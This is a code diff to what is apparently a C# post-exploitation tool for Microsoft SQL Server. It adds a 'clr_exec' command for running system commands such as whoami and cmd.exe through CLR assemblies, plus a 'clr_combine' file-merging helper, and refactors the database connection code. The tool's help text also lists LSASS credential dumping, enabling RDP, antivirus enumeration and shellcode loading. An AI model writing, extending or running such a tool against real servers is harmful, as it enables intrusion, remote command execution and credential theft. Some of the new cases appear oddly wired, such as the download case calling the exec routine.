@@ -30,6 +30,8 @@ enable_clr                 - you know what it means
 disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
+clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
+clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files           
 clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
 clr_getav                  - get anti-virus software on this machin by clr
@@ -255,37 +257,54 @@ exit                       - terminates the server process (and this session)"
             Console.WriteLine("[*] '{0}' Download completed", remoteFile);
         }
 
-        public static void OnInfoMessage(object mySender, SqlInfoMessageEventArgs args)
+        public static string result = string.Empty;
+        private static void OnInfoMessage(object mySender, SqlInfoMessageEventArgs args)
         {
-            String value = String.Empty;
+            var value = string.Empty;
             foreach (SqlError err in args.Errors)
             {
-                value = err.Message;
-                Console.WriteLine(value);
+                value += err.Message;
             }
+            result = value;
+            Console.WriteLine(result);
+        }
+
+        /// <summary>
+        /// 数据库连接
+        /// </summary>
+        public static SqlConnection SqlConnet(string target, string dbName, string uName, string passwd, ref string result)
+        {
+            SqlConnection Conn = null;
+            var connectionString = $"Server = \"{target}\";Database = \"{dbName}\";User ID = \"{uName}\";Password = \"{passwd}\";";
+            try
+            {
+                Conn = new SqlConnection(connectionString);
+                Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
+                Conn.Open();
+                result = $"[*] Database connection is successful! {DateTime.Now.ToString()}";
+                Console.WriteLine(result);
+            }
+            catch (Exception ex)
+            {
+                result = $"[!] Error log: {ex.Message}";
+                Console.WriteLine(result);
+                Environment.Exit(0);
+            }
+            return Conn;
         }
 
         static void interactive(string[] args)
         {
             string target = args[0];
+            if (target.Contains(":"))
+            {
+                target = target.Replace(":", ",");
+            }
             string username = args[1];
             string password = args[2];
             string database = args[3];
-
-            try
-            {
-                //sql建立连接
-                string connectionString = String.Format("Server = \"{0}\";Database = \"{1}\";User ID = \"{2}\";Password = \"{3}\";", target,database, username, password);
-                Conn = new SqlConnection(connectionString);
-                Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
-                Conn.Open();
-                Console.WriteLine("[*] Database connection is successful!");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[!] Error log: \r\n" + ex.Message);
-                Environment.Exit(0);
-            }
+            string result = "";
+            Conn = SqlConnet(target,database,username,password, ref result);
 
             setting = new Setting(Conn);
 
@@ -356,6 +375,13 @@ exit                       - terminates the server process (and this session)"
                                 clr_exec(s);
                                 break;
                             }
+                        case "clr_exec":
+                            {
+                                String s = String.Empty;
+                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                clr_exec(s);
+                                break;
+                            }
                         case "clr_scloader":
                             {
                                 String s = String.Empty;
@@ -378,6 +404,13 @@ exit                       - terminates the server process (and this session)"
                                 break;
                             }
                         case "clr_download":
+                            {
+                                String s = String.Empty;
+                                for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
+                                clr_exec(s);
+                                break;
+                            }
+                        case "clr_combine":
                             {
                                 String s = String.Empty;
                                 for (int i = 0; i < cmdline.Length; i++) { s += cmdline[i] + " "; }
@@ -429,24 +462,16 @@ exit                       - terminates the server process (and this session)"
                 return;
             }
             string target = args[0];
+            if (target.Contains(":"))
+            {
+                target = target.Replace(":", ",");
+            }
             string username = args[1];
             string password = args[2];
             string database = args[3];
             string module = args[4];
-            try
-            {
-                //sql建立连接
-                string connectionString = String.Format("Server = \"{0}\";Database = \"{1}\";User ID = \"{2}\";Password = \"{3}\";", target, database, username, password);
-                Conn = new SqlConnection(connectionString);
-                Conn.InfoMessage += new SqlInfoMessageEventHandler(OnInfoMessage);
-                Conn.Open();
-                Console.WriteLine("[*] Database connection is successful!");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("[!] Error log: \r\n" + ex.Message);
-                Environment.Exit(0);
-            }
+            string result = "";
+            Conn = SqlConnet(target, database, username, password, ref result);
 
             setting = new Setting(Conn);
             try
@@ -525,6 +550,13 @@ exit                       - terminates the server process (and this session)"
                             clr_exec(s);
                             break;
                         }
+                    case "clr_exec":
+                        {
+                            String s = String.Empty;
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
+                            break;
+                        }
                     case "clr_scloader":
                         {
                             String s = String.Empty;
@@ -547,6 +579,13 @@ exit                       - terminates the server process (and this session)"
                             break;
                         }
                     case "clr_download":
+                        {
+                            String s = String.Empty;
+                            for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
+                            clr_exec(s);
+                            break;
+                        }
+                    case "clr_combine":
                         {
                             String s = String.Empty;
                             for (int i = 4; i < args.Length; i++) { s += args[i] + " "; }
